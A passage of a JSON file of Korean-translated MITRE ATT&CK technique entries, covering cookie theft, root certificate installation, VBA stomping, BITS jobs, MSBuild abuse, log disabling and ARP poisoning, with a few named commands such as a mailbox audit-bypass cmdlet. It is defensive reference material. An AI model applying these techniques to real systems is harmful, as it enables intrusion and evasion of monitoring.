    "description": "적대 세력은 도난당한 세션 쿠키를 사용하여 웹 애플리케이션 및 서비스에 인증할 수 있습니다. 이 기술은 세션이 이미 인증되었기 때문에 일부 다단계 인증 프로토콜을 우회합니다.\n\n인증 쿠키는 사용자가 서비스에 인증한 후 웹 애플리케이션, 클라우드 기반 서비스에서 일반적으로 사용됩니다. 이렇게 하면 자격 증명이 전송되지 않고 재인증이 자주 발생할 필요가 없습니다. 쿠키는 종종 웹 애플리케이션이 활성 상태가 아닐 때에도 오랜 기간 유효합니다. 쿠키가 도난당한 후에는, 적대자가 자신이 제어하는 브라우저에 쿠키를 가져와 세션 쿠키가 활성화되어 있는 동안 사용자로서 사이트나 애플리케이션을 사용할 수 있습니다. 사이트에 로그인하면 적대자는 민감한 정보에 접근하거나 이메일을 읽거나 피해자 계정이 수행할 수 있는 작업을 수행할 수 있습니다.\n\n세션 쿠키를 타겟으로 다단계 인증 시스템을 우회하는 악성 소프트웨어의 사례가 있었습니다.",
    "external_id": "T1550.004",
    "modified": "2024-10-15T16:11:15.657Z",
    "translated": true
  },
  {
    "title": "Domain Accounts",
    "description": "적대자는 초기 접근, 지속성, 권한 상승 또는 방어 회피의 수단으로 도메인 계정의 자격 증명을 획득하고 악용할 수 있습니다. 도메인 계정은 액티브 디렉토리 도메인 서비스에서 관리되는 계정으로, 해당 도메인의 시스템 및 서비스에 걸쳐 접근 및 권한이 구성됩니다. 도메인 계정은 사용자, 관리자 및 서비스에 해당할 수 있습니다.\n\n적대자는 다양한 수단을 통해 도메인 계정을 악용할 수 있으며, 이 중 일부는 높은 권한을 가진 계정으로, OS 자격 증명 덤프나 비밀번호 재사용 등을 통해 도메인의 특권 자원에 접근할 수 있게 됩니다.",
    "external_id": "T1078.002",
    "modified": "2023-08-14T14:55:07.432Z",
    "translated": true
  },
  {
    "title": "Regsvcs/Regasm",
    "description": "적대자는 Regsvcs와 Regasm을 악용하여 신뢰할 수 있는 Windows 유틸리티를 통해 코드 실행을 프록시할 수 있습니다. Regsvcs와 Regasm은 .NET 컴포넌트 객체 모델(COM) 어셈블리를 등록하는 데 사용되는 Windows 명령줄 유틸리티입니다. 두 프로그램 모두 Microsoft에 의해 디지털 서명될 수 있는 바이너리입니다.\n\n이 두 유틸리티는 바이너리 내의 속성을 사용하여 등록 또는 등록 해제 전에 실행되어야 할 코드를 지정함으로써 애플리케이션 제어를 우회하는 데 사용될 수 있습니다. 등록 및 등록 해제 속성이 있는 코드는 프로세스가 권한이 부족한 상태에서 실행되고 실패하더라도 실행됩니다.",
    "external_id": "T1218.009",
    "modified": "2022-03-11T18:55:48.725Z",
    "translated": true
  },
  {
    "title": "Install Root Certificate",
    "description": "적대자는 손상된 시스템에 루트 인증서를 설치하여 적대자가 제어하는 웹 서버에 연결할 때 경고를 피할 수 있습니다. 루트 인증서는 공인 키 암호화에서 루트 인증 기관(CA)을 식별하는 데 사용됩니다. 루트 인증서가 설치되면 시스템이나 애플리케이션은 루트 인증서에 의해 서명된 루트의 신뢰 체인에 있는 인증서를 신뢰하게 됩니다. 인증서는 일반적으로 웹 브라우저 내에서 안전한 TLS/SSL 통신을 설정하는 데 사용됩니다. 사용자가 신뢰되지 않는 인증서를 제시하는 웹사이트를 탐색하려고 할 때 보안 위험에 대한 경고 메시지가 표시됩니다. 보안 설정에 따라 브라우저는 사용자가 웹사이트에 연결하는 것을 허용하지 않을 수 있습니다.\n\n손상된 시스템에 루트 인증서를 설치하면 적대자에게 해당 시스템의 보안을 악화시킬 수 있는 방법을 제공합니다. 적대자는 이 기술을 사용하여 손상된 시스템이 적대자가 제어하는 웹 서버에 HTTPS를 통해 연결할 때 사용자에게 보안 경고가 표시되지 않도록 하였습니다. 이러한 웹 서버는 합법적인 웹사이트를 스푸핑하여 로그인 자격 증명을 수집하는 데 사용됩니다.\n\n비정상적인 루트 인증서도 제조업체나 소프트웨어 공급망에 의해 시스템에 미리 설치되었으며, 악성 코드/애드웨어와 함께 사용되어 안전한 TLS/SSL 통신을 통해 전송되는 정보를 가로채는 중간자 공격 능력을 제공하였습니다.\n\n루트 인증서(및 그 관련 체인)는 복제 및 재설치될 수 있습니다. 복제된 인증서 체인은 출처와 많은 동일한 메타데이터 특성을 포함하며, 악성 코드를 서명하는 데 사용될 수 있어 이는 서명 유효성 검사 도구(예: Sysinternals, 안티바이러스 등)를 우회하게 됩니다.\n\nmacOS에서 Ay MaMi 악성 코드는 악성 인증서를 시스템 키체인의 신뢰된 루트 인증서로 설치하기 위해 특정 명령어를 사용합니다.",
    "external_id": "T1553.004",
    "modified": "2024-01-04T20:01:27.662Z",
    "translated": true
  },
  {
    "title": "Network Logon Script",
    "description": "적대자는 로그인 초기화 시 자동으로 실행되는 네트워크 로그인 스크립트를 사용하여 지속성을 유지할 수 있습니다. 네트워크 로그인 스크립트는 Active Directory 또는 그룹 정책 개체를 통해 할당될 수 있습니다. 이러한 로그인 스크립트는 할당된 사용자의 권한으로 실행됩니다. 네트워크 내 시스템에 따라 이러한 스크립트 중 하나를 초기화하는 것은 여러 시스템 또는 잠재적으로 모든 시스템에 적용될 수 있습니다. \n\n적대자는 이러한 스크립트를 사용하여 네트워크에서 지속성을 유지할 수 있습니다. 로그인 스크립트의 접근 구성에 따라 로컬 자격 증명 또는 관리자 계정이 필요할 수 있습니다.",
    "external_id": "T1037.003",
    "modified": "2020-03-24T23:45:25.625Z",
    "translated": true
  },
  {
    "title": "Endpoint Denial of Service",
    "description": "적대자는 사용자에게 서비스의 가용성을 저하시키거나 차단하기 위해 엔드포인트 서비스 거부(DoS) 공격을 수행할 수 있습니다. 엔드포인트 DoS는 해당 서비스를 호스팅하는 시스템의 리소스를 소모시키거나 시스템을 악용하여 지속적인 크래시 상태를 유발함으로써 수행될 수 있습니다. 이러한 서비스에는 웹사이트, 이메일 서비스, DNS, 웹 기반 애플리케이션 등이 포함됩니다. 적대자들은 정치적 목적을 위해 DoS 공격을 수행하는 것으로 관찰되었으며, 주의 분산을 포함한 기타 악의적인 활동을 지원하는 데 사용되었습니다.\n\n엔드포인트 DoS는 서비스에 대한 가용성을 차단하지만, 서비스에 대한 접근을 제공하는 네트워크를 포화시키지 않습니다. 적대자는 서비스를 제공하는 데 사용되는 시스템에서 호스팅되는 애플리케이션 스택의 다양한 레이어를 표적할 수 있습니다. 이러한 레이어에는 운영 체제(OS), 웹 서버, DNS 서버, 데이터베이스 및 그 위에 위치한 (일반적으로 웹 기반) 애플리케이션이 포함됩니다. 각 레이어를 공격하기 위해서는 각 구성 요소의 병목 현상을 이용하는 다양한 기술이 필요합니다. DoS 공격은 단일 시스템 또는 전 세계에 분산된 여러 시스템에서 발생할 수 있으며, 일반적으로 분산 서비스 거부(DDoS)라고 불립니다.\n\n엔드포인트 리소스에 대한 DoS 공격을 수행하기 위해 여러 측면이 여러 방법에 적용됩니다. 여기에는 IP 주소 스푸핑과 봇넷이 포함됩니다.\n\n적대자는 공격 시스템의 원래 IP 주소를 사용할 수도 있고, 공격 트래픽을 추적하기 어렵게 만들거나 반사를 가능하게 하기 위해 출발지 IP 주소를 스푸핑할 수 있습니다. 이는 네트워크 방어 장치에서 출발지 주소에 의한 필터링의 효과를 줄이거나 없애버림으로써 방어자들이 공격을 방어하는 데 어려움을 증가시킬 수 있습니다.\n\n봇넷은 네트워크와 서비스에 대한 DDoS 공격을 수행하는 데 일반적으로 사용됩니다. 대규모 봇넷은 전 세계 인터넷에 분산된 시스템에서 상당한 양의 트래픽을 생성할 수 있습니다. 적대자는 자신의 봇넷 인프라를 구축하고 제어할 자원을 가질 수도 있으며, 공격을 수행하기 위해 기존 봇넷에서 시간 임대를 받을 수도 있습니다. DDoS 공격의 경우, 요청을 생성하는 시스템이 매우 많아서 각 시스템은 목표의 리소스를 소모시키기 위해 소량의 트래픽만 전송하면 됩니다. 이러한 상황에서는 DDoS 트래픽과 합법적인 클라이언트를 구별하는 것이 매우 어려워집니다. 봇넷은 주요 미국 은행을 타겟으로 한 2012년 일련의 사건과 같은 가장 고프로필 DDoS 공격에서 사용되었습니다.\n\n트래픽 조작이 사용되는 경우, 전 세계 네트워크의 특정 지점(예: 고 트래픽 게이트웨이 라우터)에서 패킷을 변경하여 합법적인 클라이언트가 네트워크 패킷을 높은 양으로 목표로 향하도록 코드를 실행할 수 있게 할 수 있습니다. 이러한 유형의 기능은 클라이언트 HTTP 트래픽에 DDoS 코드를 생성하는 자바스크립트 참조를 포함하도록 수정했던 웹 검열의 목적으로 이전에 사용되었습니다.",
    "external_id": "T1499",
    "modified": "2024-10-15T15:56:47.424Z",
    "translated": true
  },
  {
    "title": "Compile After Delivery",
    "description": "적대자는 희생자에게 파일을 비컴파일된 코드로 전달하여 페이로드를 발견하고 분석하기 어렵게 만들려 할 수 있다. 텍스트 기반 소스 코드 파일은 실행 파일 또는 바이너스를 대상으로 하는 보호 기능의 분석과 검토를 회피할 수 있다. 이러한 페이로드는 실행 전에 컴파일되어야 하며, 일반적으로 ilasm.exe, csc.exe 또는 GCC/MinGW와 같은 네이티브 유틸리티를 통해 이루어진다.\n\n소스 코드 페이로드는 또한 암호화되거나 인코딩되거나 다른 파일에 포함될 수 있다. 페이로드는 또한 네이티브 운영 체제에서 인식할 수 없고 본질적으로 무해한 형식으로 제공될 수 있다(예: macOS/Linux에서의 EXE 파일), 이후 적절한 실행 파일로 (재)컴파일되는 과정을 거칠 수 있다.",
    "external_id": "T1027.004",
    "modified": "2024-10-03T17:43:14.766Z",
    "translated": true
  },
  {
    "title": "System Location Discovery",
    "description": "적대자는 희생자 호스트의 지리적 위치를 계산하기 위해 정보를 수집할 수 있습니다. 적대자는 자동화된 탐색 중에 시스템 위치 발견 정보를 사용하여 후속 행동을 형성할 수 있으며, 여기에는 적대자가 목표를 완전히 감염시킬지 여부와 특정 행동을 시도할지 여부가 포함됩니다.\n\n적대자는 시간대, 키보드 레이아웃 및/또는 언어 설정과 같은 다양한 시스템 검사를 사용하여 시스템의 위치를 추론하려고 시도할 수 있습니다. Windows API 함수는 호스트의 로케일을 결정하는 데 사용할 수 있습니다. 클라우드 환경에서는 인스턴스의 가용성 영역도 인스턴스 메타데이터 서비스에 접근하여 발견할 수 있습니다.\n\n적대자는 또한 온라인 지리 위치 IP 조회 서비스를 통해 IP 주소를 사용하여 희생자 호스트의 위치를 추론하려고 시도할 수 있습니다.",
    "external_id": "T1614",
    "modified": "2024-10-15T16:07:23.511Z",
    "translated": true
  },
  {
    "title": "VBA Stomping",
    "description": "적대자는 MS Office 문서 내에 삽입된 악성 비주얼 베이직 for 애플리케이션(VBA) 페이로드를 식별하기 어렵게 만들기 위해 VBA 소스 코드를 무해한 데이터로 대체할 수 있습니다.\n\nMS Office 문서에 포함된 VBA 콘텐츠는 모듈 스트림 내에 소스 코드를 저장합니다. 각 모듈 스트림에는 VBA 소스 코드의 별도로 컴파일된 버전인 p-code를 저장하는 <code>PerformanceCache</code>가 있습니다. p-code는 <code>_VBA_PROJECT</code> 스트림에 지정된 MS Office 버전이 호스트 MS Office 애플리케이션의 버전과 일치할 때 실행됩니다.\n\n적대자는 VBA 소스 코드 위치를 0, 무해한 코드 또는 무작위 바이트로 덮어써서 악성 VBA 코드를 숨길 수 있으며, 이전에 컴파일된 악성 p-code는 남겨둘 수 있습니다. 악성 VBA 소스 코드를 스캔하는 도구는 원치 않는 코드가 컴파일된 p-code에 숨겨져 있기 때문에 우회될 수 있습니다. VBA 소스 코드가 제거되면 일부 도구는 매크로가 존재하지 않는다고 생각할 수도 있습니다. <code>_VBA_PROJECT</code> 스트림과 호스트 MS Office 애플리케이션 간에 버전이 일치하면 p-code가 실행되며, 그렇지 않은 경우 무해한 VBA 소스 코드는 압축 해제되고 p-code로 다시 컴파일되어 악성 p-code가 제거되고 동적 분석을 우회할 수 있습니다.",
    "external_id": "T1564.007",
    "modified": "2021-10-15T14:02:07.944Z",
    "translated": true
  },
  {
    "title": "BITS Jobs",
    "description": "적대자는 BITS 작업을 남용하여 지속적으로 코드를 실행하고 각종 배경 작업을 수행할 수 있습니다. Windows 배경 지능 전송 서비스(BITS)는 낮은 대역폭의 비동기 파일 전송 메커니즘으로, COM을 통해 노출됩니다. BITS는 일반적으로 업데이트 프로그램, 메신저 및 다른 배경에서 작동하기를 선호하는 애플리케이션에 의해 사용됩니다(사용 가능한 유휴 대역폭을 활용) 다른 네트워크 애플리케이션을 방해하지 않고 파일 전송 작업은 하나 이상의 파일 작업의 큐를 포함하는 BITS 작업으로 구현됩니다.\n\nBITS 작업을 생성하고 관리하는 인터페이스는 PowerShell과 BITSAdmin 도구를 통해 접근할 수 있습니다.\n\n적대자는 BITS를 남용하여(예: 코드 다운로드, 실행, 심지어 악성 코드 실행 후 정리) 작업을 수행할 수 있습니다. BITS 작업은 새로운 파일이나 레지스트리 수정 없이 BITS 작업 데이터베이스에 독립적으로 포함되며, 종종 호스트 방화벽에 의해 허용됩니다. BITS를 통한 실행은 장기적인 작업을 생성하여 지속성을 가능하게 할 수 있으며(기본 최대 기간은 90일이며 연장 가능) 작업이 완료되거나 오류가 발생할 때 임의의 프로그램을 호출할 수 있습니다(시스템 재부팅 후 포함).\n\nBITS 업로드 기능은 대체 프로토콜을 통한 탈취 수행에도 사용될 수 있습니다.",
    "external_id": "T1197",
    "modified": "2023-04-21T12:21:40.927Z",
    "translated": true
  },
  {
    "title": "MSBuild",
    "description": "적대자는 신뢰할 수 있는 Windows 유틸리티를 통해 코드 실행을 프록시하기 위해 MSBuild를 사용할 수 있습니다. MSBuild.exe는 Visual Studio에서 사용되는 소프트웨어 빌드 플랫폼입니다. 이는 다양한 플랫폼과 구성의 로딩 및 빌드를 정의하는 XML 형식의 프로젝트 파일을 처리합니다.\n\n적대자는 MSBuild를 악성 코드 실행의 프록시로 악용할 수 있습니다. .NET 버전 4에서 도입된 MSBuild의 인라인 작업 기능은 XML 프로젝트 파일에 C# 또는 Visual Basic 코드를 삽입할 수 있게 해줍니다. MSBuild는 인라인 작업을 컴파일하고 실행합니다. MSBuild.exe는 서명된 Microsoft 바이너리이므로 이러한 방식으로 사용될 때 임의의 코드를 실행하고 MSBuild.exe 실행을 허용하도록 구성된 애플리케이션 제어 방어를 우회할 수 있습니다.",
    "external_id": "T1127.001",
    "modified": "2023-08-14T19:23:58.317Z",
    "translated": true
  },
  {
    "title": "Impersonation",
    "description": "적대자들은 신뢰받는 사람이나 조직을 가장하여 목표를 설득하고 속여 특정 행동을 그들의 대신 하도록 유도할 수 있습니다. 예를 들어, 적대자들은 익명 메일 주소를 사용하여 피해자와 의사소통하며, 잘 알려진 발신자(예: 경영진, 동료 또는 제3자 공급업체)로 가장할 수 있습니다. 이러한 신뢰는 적대자의 궁극적인 목표를 달성하는 데 활용될 수 있으며, 이는 여러 피해자를 대상으로 할 수 있습니다.\n\n많은 비즈니스 이메일 침해 또는 이메일 사기 캠페인에서 적대자들은 사기를 치기 위해 가장을 사용하여 피해자들이 돈을 보내거나 정보 공개를 하도록 속입니다. 이는 결국 재정적 도盗로 이어질 수 있습니다.\n\n적대자들은 또한 이메일 제목과 본문에 '지불', '요청', 또는 '긴급'과 같은 조작적이고 설득력 있는 언어를 사용하여 피해자가 악의적인 활동이 감지되기 전에 신속하게 행동하게 유도합니다. 이러한 캠페인은 일반적으로 직무 역할이나 접근 권한으로 인해 적대자의 목표를 수행할 수 있는 사람들을 겨냥합니다.\n\n가장은 일반적으로 피해자의 신원을 수집하고 피해자 조직 정보를 모으는 정찰 기술로 선행됩니다. 또한 이메일 도메인과 같은 인프라를 확보하여 그들의 허위 신원을 입증합니다.\n\n가장과 관련된 캠페인에서는 여러 피해자가 발생할 위험이 있습니다. 예를 들어, 적대자가 하나의 조직을 목표로 하여 계정을 침해하면, 이를 활용하여 다른 단체에 대한 가장을 지원할 수 있습니다.",
    "external_id": "T1656",
    "modified": "2024-10-15T15:59:06.382Z",
    "translated": true
  },
  {
    "title": "Modify Cloud Compute Configurations",
    "description": "적대자는 방어를 회피하기 위해 클라우드 컴퓨팅 인프라의 크기, 위치 및 사용 가능한 리소스에 직접 영향을 미치는 설정을 수정할 수 있습니다. 이러한 설정에는 서비스 쿼터, 구독 관계, 테넌트 전반의 정책 또는 사용 가능한 컴퓨팅에 영향을 미치는 기타 구성 요소가 포함될 수 있습니다. 이러한 수정은 적대자가 피해자의 컴퓨팅 리소스를 남용하여 자신의 목표를 달성하게 할 수 있으며, 이는 실행 중인 인스턴스의 실행에 영향을 미치지 않거나 피해자에게 자신의 활동을 드러내지 않을 수 있습니다.\n\n클라우드 제공업체는 종종 고객의 컴퓨팅 리소스 사용을 쿼터를 통해 제한합니다. 고객은 증가된 컴퓨팅 요구를 지원하기 위해 이러한 쿼터 조정을 요청할 수 있지만, 이러한 조정에는 클라우드 제공업체의 승인이 필요할 수 있습니다. 클라우드 환경을 침해한 적대자는 자신의 활동을 지원하기 위해 쿼터 조정을 요청할 수도 있습니다. 예를 들어, 피해자의 전체 쿼터를 소진함으로써 의심을 일으키지 않고 추가 리소스 하이재킹을 가능하게 할 수 있습니다. 또한 적대자는 배포된 가상 머신의 크기를 제한하는 테넌트 전반의 정책을 수정하여 허용된 리소스 사용량을 증가시킬 수 있습니다. \n\n적대자는 클라우드 리소스가 배포될 수 있는 위치에 영향을 미치는 설정을 수정할 수도 있습니다.",
    "external_id": "T1578.005",
    "modified": "2024-09-25T14:15:26.322Z",
    "translated": true
  },
  {
    "title": "Domain Fronting",
    "description": "대적자는 콘텐츠 전송 네트워크(CDN) 및 여러 도메인을 호스팅하는 다른 서비스의 라우팅 방식의 이점을 이용하여 HTTPS 트래픽 또는 HTTPS를 통해 터널링된 트래픽의 의도된 목적지를 혼동시킬 수 있습니다. 도메인 프론팅은 TLS 헤더의 SNI 필드와 HTTP 헤더의 Host 필드에 서로 다른 도메인 이름을 사용하는 것을 포함합니다. 두 도메인이 동일한 CDN에서 제공되는 경우, CDN은 TLS 헤더를 해제한 후 HTTP 헤더에 지정된 주소로 라우팅할 수 있습니다. 이 기술의 변형인 \"도메인 없는\" 프론팅은 SNI 필드를 비워두고 사용하는데, 이는 CDN이 SNI와 HTTP Host 필드의 일치를 검증하려고 할 때 비어 있는 SNI 필드를 무시하면 프론팅이 작동할 수 있게 할 수 있습니다.\n\n예를 들어, 도메인-x와 도메인-y가 동일한 CDN의 고객일 경우, TLS 헤더에 도메인-x를 넣고 HTTP 헤더에 도메인-y를 넣을 수 있습니다. 트래픽은 도메인-x로 가는 것처럼 보이지만, CDN은 이를 도메인-y로 라우팅할 수 있습니다.",
    "external_id": "T1090.004",
    "modified": "2023-03-30T21:01:52.356Z",
    "translated": true
  },
  {
    "title": "ARP Cache Poisoning",
    "description": "적대자는 주소 변환 프로토콜(ARP) 캐시를 변조하여 두 개 이상의 네트워크 장치 간의 통신 사이에 자신을 위치시킬 수 있습니다. 이 활동은 네트워크 스니핑이나 전송 데이터 조작과 같은 후속 행동을 가능하게 하는 데 사용될 수 있습니다.\n\nARP 프로토콜은 IPv4 주소를 링크 계층 주소(예: 미디어 접근 제어(MAC) 주소)로 변환하는 데 사용됩니다. 로컬 네트워크 세그먼트의 장치들은 링크 계층 주소를 사용하여 서로 통신합니다. 네트워크 장치가 특정 네트워크 장치의 링크 계층 주소를 가지고 있지 않으면, IP 주소를 MAC 주소로 변환하기 위해 로컬 네트워크에 브로드캐스트 ARP 요청을 보낼 수 있습니다. 해당 IP 주소와 관련된 장치는 직접적으로 자신의 MAC 주소로 응답합니다. ARP 요청을 보낸 네트워크 장치는 이 정보를 사용하고 ARP 캐시에 저장합니다.\n\n적대자는 ARP 요청이 들어오는 것을 수동적으로 기다리며 요청하는 장치의 ARP 캐시를 변조할 수 있습니다. 적대자는 자신의 MAC 주소로 응답하여 피해자가 의도한 네트워크 장치와 통신하고 있다고 믿도록 속일 수 있습니다. 적대자가 ARP 캐시를 변조하기 위해서는 자격 있는 IP 주소 소유자가 한 응답보다 응답이 더 빨라야 합니다. 적대자는 또한 로컬 네트워크 세그먼트의 모든 장치에 특정 IP 주소의 소유권을 악의적으로 알리는 무료 ARP 응답을 보낼 수도 있습니다.\n\nARP 프로토콜은 상태 비저장(stateless)이며 인증을 요구하지 않습니다. 따라서 장치들은 ARP 캐시에서 IP 주소의 MAC 주소를 잘못 추가하거나 업데이트할 수 있습니다.\n\n적대자는 ARP 캐시 변조를 네트워크 트래픽을 가로채는 수단으로 사용할 수 있습니다. 이 활동은 자격 증명과 같은 데이터를 수집하거나 중계하는 데 사용될 수 있으며, 특히 안전하지 않고 암호화되지 않은 프로토콜을 통해 전송되는 경우에 그러합니다.",
    "external_id": "T1557.002",
    "modified": "2022-07-22T18:37:22.176Z",
    "translated": true
  },
  {
    "title": "Disable or Modify Cloud Logs",
    "description": "적들은 클라우드 로깅 기능 및 통합을 비활성화하거나 수정하여 자신의 활동에 대한 데이터 수집을 제한하고 탐지를 피할 수 있습니다. 클라우드 환경에서는 감사 및 애플리케이션 로그를 수집하고 분석하여 사용자가 환경 내에서 수행하는 활동에 대한 통찰력을 제공합니다. 만약 적들이 충분한 권한을 가지고 있다면, 그들은 자신의 활동을 탐지되지 않게 하기 위해 로깅을 비활성화하거나 수정할 수 있습니다.\n\n예를 들어, AWS에서는 적들이 추가 악의적인 활동을 진행하기 전에 CloudWatch/CloudTrail 통합을 비활성화할 수 있습니다. 그들은 로깅 기능을 변조할 수도 있는데, 예를 들어 연관된 SNS 주제를 제거하거나, 다중 지역 로깅을 비활성화하거나, 로그 파일을 검증하고/또는 암호화하는 설정을 비활성화하는 방식으로 가능합니다. Office 365에서는 적들이 특정 사용자에 대한 메일 수집 활동의 로깅을 비활성화하기 위해 `Set-MailboxAuditBypassAssociation` cmdlet을 사용하거나, 사용자의 M365 고급 감사를 비활성화하거나, 사용자의 라이센스를 엔터프라이즈 E5에서 엔터프라이즈 E3 라이센스로 다운그레이드할 수 있습니다.",
    "external_id": "T1562.008",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Security Software Discovery",
    "description": "적대자들은 시스템이나 클라우드 환경에 설치된 보안 소프트웨어, 구성, 방어 도구 및 센서 목록을 얻으려 시도할 수 있습니다. 여기에는 클라우드 모니터링 에이전트 및 안티바이러스와 같은 것들이 포함될 수 있습니다. 적대자들은 자동화된 검색에서 이러한 정보를 사용하여 후속 행동을 형성할 수 있으며, 여기에는 적대자가 목표를 완전히 감염시키는지 또는 특정 행동을 시도하는지가 포함됩니다.\n\n보안 소프트웨어 정보를 얻기 위해 사용할 수 있는 예시 명령어로는 `netsh`, `reg query`와 `Reg`, `dir`과 `cmd`, `Tasklist` 등이 있으며, 그러나 발견 행동의 다른 지표는 적대자가 찾고 있는 소프트웨어나 보안 시스템의 유형에 더 구체적일 수 있습니다. macOS 악성코드가 LittleSnitch 및 KnockKnock 소프트웨어를 확인하는 것을 보는 것이 점점 더 일반화되고 있습니다.\n\n적대자들은 또한 클라우드 네이티브 보안 소프트웨어를 발견하기 위해 클라우드 API를 활용할 수 있으며, 이에는 AWS CloudWatch 에이전트, Azure VM 에이전트 및 Google Cloud Monitor 에이전트가 포함됩니다. 이러한 에이전트는 VM에서 메트릭과 로그를 수집할 수 있으며, 이는 클라우드 기반 모니터링 플랫폼에 중앙 집중화될 수 있습니다.",
    "external_id": "T1518.001",
    "modified": "2024-04-16T00:15:53.303Z",
    "translated": true
  },
  {
    "title": "Hidden Window",
    "description": "적대자들은 숨겨진 창을 사용하여 사용자에게 악의적 활동을 가릴 수 있습니다. 어떤 경우에는 애플리케이션이 작업을 수행할 때 일반적으로 표시되는 창이 숨겨질 수 있습니다. 이는 시스템 관리자가 관리 작업을 수행할 때 사용자 작업 환경을 방해하지 않기 위해 활용할 수 있습니다.\n\n적대자들은 이러한 기능을 남용하여 사용자에게 보이는 창을 숨겨 시스템에서의 적대자 활동에 대해 사용자가 경고받지 않도록 할 수 있습니다.\n\nmacOS에서는 애플리케이션이 실행되는 방법에 대한 구성 정보가 속성 목록(plist) 파일에 나열됩니다. 이러한 파일의 태그 중 하나는 `apple.awt.UIElement`로, 이는 Java 애플리케이션이 Dock에 애플리케이션 아이콘이 나타나는 것을 방지할 수 있게 합니다. 일반적인 용도는 애플리케이션이 시스템 트레이에서 실행되지만 Dock에 나타나지 않기를 원할 때 입니다.\n\n유사하게, Windows에는 창을 숨기는 다양한 기능이 있는 스크립팅 언어들이 있습니다. 예를 들어, `powershell.exe -WindowStyle Hidden` 명령을 사용하여 창을 숨길 수 있습니다.\n\n또한, Windows는 숨겨진 데스크톱 창을 생성할 수 있는 `CreateDesktop()` API를 지원하며, 이는 자신의 `explorer.exe` 프로세스를 갖습니다. 숨겨진 VNC(hVNC) 세션과 같은 모든 애플리케이션은 이 숨겨진 데스크톱 창에서 실행되며, 다른 데스크톱 창에서 보이지 않게 됩니다.",
    "external_id": "T1564.003",
    "modified": "2024-04-13T14:28:20.651Z",
    "translated": true
  },
  {
    "title": "Python",
    "description": "적대 세력은 실행을 위해 Python 명령어와 스크립트를 악용할 수 있습니다. Python은 많은 기능을 수행할 수 있는 매우 인기 있는 스크립트/프로그래밍 언어입니다. Python은 명령줄에서 대화식으로 실행되거나 (.py) 다른 시스템에 작성하고 배포할 수 있는 스크립트를 통해 실행될 수 있습니다. Python 코드는 또한 이진 실행파일로 컴파일될 수 있습니다.\n\nPython은 파일 작업 및 장치 I/O와 같은 기본 시스템과 상호작용하기 위한 많은 내장 패키지를 제공합니다. 적대 세력은 이러한 라이브러리를 사용하여 명령이나 다른 스크립트를 다운로드하고 실행하거나 다양한 악성 행동을 수행할 수 있습니다.",
    "external_id": "T1059.006",
    "modified": "2024-01-30T18:35:58.021Z",
    "translated": true
  },
  {
    "title": "Identify Roles",
    "description": "적대자는 피해 조직 내의 신원 및 역할에 대한 정보를 수집할 수 있으며, 이는 표적 설정 시 활용될 수 있습니다. 비즈니스 역할에 대한 정보는 주요 인물에 대한 식별 가능한 정보와 그들이 접근할 수 있는 데이터/자원에 대한 다양한 표적 세부 정보를 드러낼 수 있습니다.\n\n이 정보는 여러 방법으로 수집될 수 있으며, 예를 들어 정보 유출을 통한 직접적인 방식이나 온라인 또는 기타 접근 가능한 데이터 세트를 통해 드러날 수 있습니다. 이러한 정보를 수집하는 것은 다른 형태의 정찰을 위한 기회를 제공할 수 있으며, 운영 자원을 구축하거나 초기 접근을 설정하는 데에도 도움이 될 수 있습니다.",
    "external_id": "T1591.004",
    "modified": "2021-04-15T03:39:08.904Z",
    "translated": true
  },
  {
    "title": "Data Encoding",
    "description": "적대자는 명령 및 제어 트래픽의 내용을 감지하기 어렵게 만들기 위해 데이터를 인코딩할 수 있습니다. 명령 및 제어(C2) 정보는 표준 데이터 인코딩 시스템을 사용하여 인코딩될 수 있습니다. 데이터 인코딩의 사용은 기존 프로토콜 사양을 준수할 수 있으며 ASCII, 유니코드, Base64, MIME 또는 기타 이진-텍스트 및 문자 인코딩 시스템의 사용을 포함합니다. 일부 데이터 인코딩 시스템은 gzip과 같은 데이터 압축을 초래할 수도 있습니다.",
    "external_id": "T1132",
    "modified": "2023-04-21T12:20:20.711Z",
    "translated": true
  },
  {
    "title": "AppInit DLLs",
    "description": "적대자는 AppInit DLL에 의해 로드된 프로세스에서 트리거된 악성 콘텐츠를 실행하여 지속성을 설정하거나 권한을 상승시킬 수 있습니다. 레지스트리 키에 있는 <code>AppInit_DLLs</code> 값에 지정된 다이내믹 링크 라이브러리(DLL)는 user32.dll에 의해 로드되어 user32.dll을 로드하는 모든 프로세스에서 사용됩니다. 실제로 user32.dll은 매우 일반적인 라이브러리이므로 이는 거의 모든 프로그램에서 발생합니다. \n\n프로세스 인젝션과 유사하게 이러한 값은 악성 DLL이 컴퓨터의 개별 프로세스 컨텍스트에서 로드되고 실행되도록 하여 권한 상승을 얻기 위해 악용될 수 있습니다. 악성 AppInit DLL은 API 활동에 의해 지속적으로 트리거됨으로써 지속성을 제공할 수도 있습니다. \n\nWindows 8 및 이후 버전에서는 보안 부팅이 활성화된 경우 AppInit DLL 기능이 비활성화됩니다.",
    "external_id": "T1546.010",
    "modified": "2023-04-21T12:33:45.568Z",
    "translated": true
  },
  {
    "title": "Phishing for Information",
    "description": "공격자는 민감한 정보를 얻기 위해 피싱 메시지를 보낼 수 있으며, 이 정보는 타겟팅 중에 사용될 수 있습니다. 정보에 대한 피싱은 타겟이 정보를 유출하도록 속이려는 시도로, 종종 자격 증명이나 다른 실행 가능한 정보를 포함합니다. 정보에 대한 피싱은 피해자로부터 데이터를 수집하는 것이 목표이므로, 악성 코드를 실행하는 것과는 다릅니다.\n\n모든 형태의 피싱은 전자적으로 전달되는 사회 공학 기법입니다. 피싱은 특정 대상을 겨냥한 것으로 스피어 피싱(spear phishing)이라고도 합니다. 스피어 피싱에서는 공격자가 특정 개인, 회사 또는 산업을 목표로 삼습니다. 더 일반적으로, 공격자는 대규모 자격 증명 수집 캠페인과 같은 비대상 피싱을 수행할 수 있습니다.\n\n공격자는 이메일, 즉시 메시지 또는 기타 전자 대화 수단을 통해 정보를 직접 얻으려 할 수도 있습니다. 피해자는 공격자가 기밀 정보를 수집하려고 시도하는 전화번호로 전화를 하도록 유도하는 피싱 메시지를 받을 수도 있습니다.\n\n정보에 대한 피싱은 종종 정보를 수집할 이유가 있는 소스인 척 하는 등의 사회 공학 기법을 포함하며, 다수의 긴급한 메시지를 보내는 방식으로 이뤄질 수 있습니다. 또 다른 방식으로는 발신자의 신원을 위조하거나 스푸핑하여 인간 수신자와 자동화된 보안 도구를 모두 속이는 방법이 있습니다.\n\n정보에 대한 피싱은 또한 피하는 기술을 포함할 수 있으며, 이는 메시지를 보내기 위해 남용되는 손상된 계정에서 이메일이나 메타데이터/헤더를 